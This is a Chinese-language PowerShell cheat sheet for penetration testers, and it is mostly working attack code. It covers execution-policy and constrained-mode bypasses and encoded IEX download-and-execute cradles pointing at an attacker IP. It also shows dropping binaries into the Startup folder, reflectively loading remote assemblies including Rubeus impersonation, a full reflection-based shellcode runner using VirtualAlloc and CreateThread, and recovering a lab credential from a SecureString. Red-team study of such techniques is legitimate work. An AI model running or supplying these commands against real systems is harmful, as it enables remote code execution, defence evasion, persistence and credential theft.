# PowerShell

## 概述

- [PowerShell](#powershell)
  - [概述](#summary)
  - [执行策略](#execution-policy)
  - [编码命令](#encoded-commands)
  - [受限模式](#constrained-mode)
  - [编码命令](#encoded-commands)
  - [下载文件](#download-file)
  - [加载PowerShell脚本](#load-powershell-scripts)
  - [反射式加载C#程序集](#load-c-assembly-reflectively)
  - [使用反射通过委托函数调用Win API](#call-win-api-using-delegate-functions-with-reflection)
    - [解析地址函数](#resolve-address-functions)
    - [委托类型反射](#delegatetype-reflection)
    - [带有简单Shellcode运行器的示例](#example-with-a-simple-shellcode-runner)
  - [安全字符串转换为纯文本](#secure-string-to-plaintext)
  - [参考资料](#references)

## 执行策略

```ps1
powershell -EncodedCommand $encodedCommand
powershell -ep bypass ./PowerView.ps1

# 更改执行策略
Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
Set-ExecutionPolicy Bypass -Scope Process
```

## 受限模式

```ps1
# 检查我们是否处于受限模式
# 值可以是：FullLanguage 或 ConstrainedLanguage
$ExecutionContext.SessionState.LanguageMode

## 绕过
powershell -version 2
```

## 编码命令

* Windows

  ```ps1
  $command = 'IEX (New-Object Net.WebClient).DownloadString("http://10.10.10.10/PowerView.ps1")'
  $bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
  $encodedCommand = [Convert]::ToBase64String($bytes)
  ```

* Linux: :warning: 需要UTF-16LE编码

  ```ps1
  echo 'IEX (New-Object Net.WebClient).DownloadString("http://10.10.10.10/PowerView.ps1")' | iconv -t utf-16le | base64 -w 0
  ```

## 下载文件

```ps1
# 任何版本
(New-Object System.Net.WebClient).DownloadFile("http://10.10.10.10/PowerView.ps1", "C:\Windows\Temp\PowerView.ps1")
wget "http://10.10.10.10/taskkill.exe" -OutFile "C:\ProgramData\unifivideo\taskkill.exe"
Import-Module BitsTransfer; Start-BitsTransfer -Source $url -Destination $output

# PowerShell 4+
IWR "http://10.10.10.10/binary.exe" -OutFile "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\binary.exe"
Invoke-WebRequest "http://10.10.10.10/binary.exe" -OutFile "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\binary.exe"
```

## 加载PowerShell脚本

```ps1
# 支持代理
IEX (New-Object Net.WebClient).DownloadString('http://10.10.10.10/PowerView.ps1')
echo IEX(New-Object Net.WebClient).DownloadString('http://10.10.10.10/PowerView.ps1') | powershell -noprofile -
powershell -exec bypass -c "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://10.10.10.10/PowerView.ps1')|iex"

# 不支持代理
$h=new-object -com WinHttp.WinHttpRequest.5.1;$h.open('GET','http://10.10.10.10/PowerView.ps1',$false);$h.send();iex $h.responseText
```

## 反射式加载C#程序集

```powershell
# 下载并运行无参数的程序集
$data = (New-Object System.Net.WebClient).DownloadData('http://10.10.16.7/rev.exe')
$assem = [System.Reflection.Assembly]::Load($data)
[rev.Program]::Main()

# 下载并运行Rubeus，带参数（确保拆分参数）
$data = (New-Object System.Net.WebClient).DownloadData('http://10.10.16.7/Rubeus.exe')
$assem = [System.Reflection.Assembly]::Load($data)
[Rubeus.Program]::Main("s4u /user:web01$ /rc4:1d77f43d9604e79e5626c6905705801e /impersonateuser:administrator /msdsspn:cifs/file01 /ptt".Split())

# 从程序集（例如DLL）执行特定方法
$data = (New-Object System.Net.WebClient).DownloadData('http://10.10.16.7/lib.dll')
$assem = [System.Reflection.Assembly]::Load($data)
$class = $assem.GetType("ClassLibrary1.Class1")
$method = $class.GetMethod("runner")
$method.Invoke(0, $null)
```

## 使用反射通过委托函数调用Win API

### 解析地址函数

要执行反射，我们首先需要获取`GetModuleHandle`和`GetProcAddress`，以便能够查找Win32 API函数地址。

要检索这些函数，我们需要找出它们是否包含在现有的已加载程序集中。

```powershell
# 检索所有已加载的程序集
$Assemblies = [AppDomain]::CurrentDomain.GetAssemblies()

遍历所有程序集，检索所有静态和不安全方法
$Assemblies |
  ForEach-Object {
    $_.GetTypes()|
      ForEach-Object {
          $_ | Get-Member -Static| Where-Object {
            $_.TypeName.Contains('Unsafe')
          }
      } 2> $null
```

我们想要找到程序集的位置，所以我们将使用`Location`语句。然后我们将在程序集`Microsoft.Win32.UnsafeNativeMethods`中查找所有方法。
TBN：`GetModuleHandle`和`GetProcAddress`位于`C:\Windows\Microsoft.Net\assembly\GAC_MSIL\System\v4.0_4.0.0.0__b77a5c561934e089\System.dll`中。

如果我们想使用这些函数，我们首先需要获得所需.dll文件的引用，对象需要具有属性`GlobalAssemblyCache`设置（全局程序集缓存本质上是Windows上所有本机和注册程序集的列表，这将允许我们过滤掉非本机程序集）。第二个过滤器是检索`System.dll`。

```powershell
$systemdll = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { 
  $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') 
})
  
$unsafeObj = $systemdll.GetType('Microsoft.Win32.UnsafeNativeMethods')
```

要检索`GetModuleHandle`方法，我们可以使用`GetMethod(<METHOD_NAME>)`方法来检索它。
`$GetModuleHandle = $unsafeObj.GetMethod('GetModuleHandle')`

现在我们可以使用我们的对象`$GetModuleHandle`的`Invoke`方法来获取非托管DLL的引用。
Invoke方法有两个参数，都是对象：

* 第一个参数是要在其上调用它的对象，但由于我们在静态方法上使用它，我们可以将其设置为"$null"。
* 第二个参数是一个数组，包含我们要调用的方法的参数（GetModuleHandle）。由于Win32 API只接受一个字符串作为DLL的名称，我们只需要提供那个。
  `$GetModuleHandle.Invoke($null, @("user32.dll"))`

然而，我们想要使用相同的方法来使用`GetProcAddress`函数，这是行不通的，因为我们的`System.dll`对象检索包含了多个`GetProcAddress`方法的实例。因此，内部方法`GetMethod()`将抛出一个错误`"Ambiguous match found."`。

因此，我们将使用`GetMethods()`方法来获取所有可用方法，然后遍历它们以仅检索我们想要的方法。

```powershell
$unsafeObj.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$_}}
```

如果我们想要获取`GetProcAddress`引用，我们将构造一个数组来存储我们的匹配对象，并使用第一个条目。

```powershell
$unsafeObj.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp+=$_}}
$GetProcAddress = $tmp[0]
```

我们需要取第一个，因为第二个的参数类型与我们的不匹配。

或者，我们可以使用`GetMethod`函数来指定我们想要的参数类型。

```powershell
$GetProcAddress = $unsafeObj.GetMethod('GetProcAddress',
			     [reflection.bindingflags]'Public,Static', 
			     $null, 
                             [System.Reflection.CallingConventions]::Any,
                             @([System.IntPtr], [string]), 
                             $null);
```

参考：[https://learn.microsoft.com/en-us/dotnet/api/system.type.getmethod?view=net-7.0](https://learn.microsoft.com/en-us/dotnet/api/system.type.getmethod?view=net-7.0)

现在我们有了解析任何我们想要的函数地址所需的一切。

```powershell
$user32 = $GetModuleHandle.Invoke($null, @("user32.dll"))
$tmp=@()
$unsafeObj.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp+=$_}}
$GetProcAddress = $tmp[0]
$GetProcAddress.Invoke($null, @($user32, "MessageBoxA"))
```

如果我们将所有内容放入一个函数中：

```powershell
function LookupFunc {

    Param ($moduleName, $functionName)

    $assem = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
    $tmp=@()
    $assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp+=$_}}
    return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null, @($moduleName)), $functionName))
}
```

### 委托类型反射

为了能够使用我们获取到地址的函数，我们需要将关于参数数量及其相关数据类型的信息与解析出的函数内存地址配对。这是通过`DelegateType`来完成的。
委托类型反射包括手动在内存中创建一个程序集并用内容填充它。

第一步是使用`AssemblyName`类创建一个新的程序集并为其分配一个名称。

```powershell
$MyAssembly = New-Object System.Reflection.AssemblyName('ReflectedDelegate')
```

现在我们想要为我们的程序集设置权限。我们需要将其设置为可执行，并且不保存到磁盘。为此，将使用方法`DefineDynamicAssembly`。

```powershell
$Domain = [AppDomain]::CurrentDomain
$MyAssemblyBuilder = $Domain.DefineDynamicAssembly($MyAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
```

现在一切准备就绪，我们可以开始在我们的程序集内创建内容。首先，我们需要创建一个主要构建块，即模块。这可以通过方法`DefineDynamicModule`完成。
该方法需要一个自定义名称作为第一个参数，以及一个布尔值指示是否包含符号。

```powershell
$MyModuleBuilder = $MyAssemblyBuilder.DefineDynamicModule('InMemoryModule', $false)
```

下一步包括创建一个自定义类型，它将变成我们的委托类型。这可以用方法`DefineType`来完成。
参数包括：

* 自定义名称
* 类型的属性
* 它基于的类型

```powershell
$MyTypeBuilder = $MyModuleBuilder.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
```

然后我们需要设定我们函数的原型。
首先我们需要使用方法`DefineConstructor`来定义一个构造函数。该方法需要三个参数：

* 构造函数的属性
* 调用约定
* 将成为函数原型的构造函数的参数类型

```powershell
$MyConstructorBuilder = $MyTypeBuilder.DefineConstructor('RTSpecialName, HideBySig, Public',
                                                        [System.Reflection.CallingConventions]::Standard,
                                                        @([IntPtr], [String], [String], [int]))
```

然后我们需要使用`SetImplementationFlags`方法设置一些实现标志。

```powershell
$MyConstructorBuilder.SetImplementationFlags('Runtime, Managed')
```

为了能够调用我们的函数，我们需要在委托类型中定义`Invoke`方法。为此，`DefineMethod`方法允许我们这样做。
该方法需要四个参数：

* 定义的方法的名称
* 方法属性
* 返回类型
* 参数类型数组

```powershell
$MyMethodBuilder = $MyTypeBuilder.DefineMethod('Invoke',
                                                'Public, HideBySig, NewSlot, Virtual',
                                                [int],
                                                @([IntPtr], [String], [String], [int]))
```

如果我们将所有内容放入一个函数中：

```powershell
function Get-Delegate
{
    Param (
        [Parameter(Position = 0, Mandatory = $True)] [IntPtr] $funcAddr, # 函数地址
        [Parameter(Position = 1, Mandatory = $True)] [Type[]] $argTypes, # 带有参数类型的数组
        [Parameter(Position = 2)] [Type] $retType = [Void] # 返回类型
    )

    $type = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('QD')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).
    DefineDynamicModule('QM', $false).
    DefineType('QT', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
    $type.DefineConstructor('RTSpecialName, HideBySig, Public',[System.Reflection.CallingConventions]::Standard, $argTypes).SetImplementationFlags('Runtime, Managed')
    $type.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $retType, $argTypes).SetImplementationFlags('Runtime, Managed')
    $delegate = $type.CreateType()

    return [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($funcAddr, $delegate)
}
```

### 一个简单的shellcode运行器示例

```powershell
# 创建一个委托函数以便能够调用我们有地址的函数
function Get-Delegate
{
    Param (
        [Parameter(Position = 0, Mandatory = $True)] [IntPtr] $funcAddr, # 函数地址
        [Parameter(Position = 1, Mandatory = $True)] [Type[]] $argTypes, # 带有参数类型的数组
        [Parameter(Position = 2)] [Type] $retType = [Void] # 返回类型
    )

    $type = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('QD')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).
    DefineDynamicModule('QM', $false).
    DefineType('QT', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
    $type.DefineConstructor('RTSpecialName, HideBySig, Public',[System.Reflection.CallingConventions]::Standard, $argTypes).SetImplementationFlags('Runtime, Managed')
    $type.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $retType, $argTypes).SetImplementationFlags('Runtime, Managed')
    $delegate = $type.CreateType()

    return [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($funcAddr, $delegate)
}
# 允许从dll中检索函数地址
function LookupFunc {

	Param ($moduleName, $functionName)

	$assem = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
    $tmp=@()
    $assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp+=$_}}
	return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null, @($moduleName)), $functionName))
}

# 使用委托的简单Shellcode运行器
$VirtualAllocAddr = LookupFunc "Kernel32.dll" "VirtualAlloc"
$CreateThreadAddr = LookupFunc "Kernel32.dll" "CreateThread"
$WaitForSingleObjectAddr = LookupFunc "Kernel32.dll" "WaitForSingleObject" 


$VirtualAlloc = Get-Delegate $VirtualAllocAddr @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr])
$CreateThread = Get-Delegate $CreateThreadAddr @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr])
$WaitForSingleObject = Get-Delegate $WaitForSingleObjectAddr @([IntPtr], [Int32]) ([Int])

[Byte[]] $buf = 0xfc,0x48,0x83,0xe4,0xf0 ...

$mem = $VirtualAlloc.Invoke([IntPtr]::Zero, $buf.Length, 0x3000, 0x40)
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $mem, $buf.Length)
$hThread = $CreateThread.Invoke([IntPtr]::Zero, 0, $mem, [IntPtr]::Zero, 0, [IntPtr]::Zero)
$WaitForSingleObject.Invoke($hThread, 0xFFFFFFFF)

```

## 安全字符串转换为纯文本

```ps1
$pass = "01000000d08c9ddf0115d1118c7a00c04fc297eb01000000e4a07bc7aaeade47925c42c8be5870730000000002000000000003660000c000000010000000d792a6f34a55235c22da98b0c041ce7b0000000004800000a00000001000000065d20f0b4ba5367e53498f0209a3319420000000d4769a161c2794e19fcefff3e9c763bb3a8790deebf51fc51062843b5d52e40214000000ac62dab09371dc4dbfd763fea92b9d5444748692" | convertto-securestring
$user = "HTB\Tom"
$cred = New-Object System.management.Automation.PSCredential($user, $pass)
$cred.GetNetworkCredential() | fl
UserName       : Tom
Password       : 1ts-mag1c!!!
SecurePassword : System.Security.SecureString
Domain         : HTB
```

## 参考资料

* [Windows & Active Directory Exploitation Cheat Sheet and Command Reference - @chvancooten](https://casvancooten.com/posts/2020/11/windows-active-directory-exploitation-cheat-sheet-and-command-reference/)
* [Basic PowerShell for Pentesters - HackTricks](https://book.hacktricks.xyz/windows/basic-powershell-for-pentesters)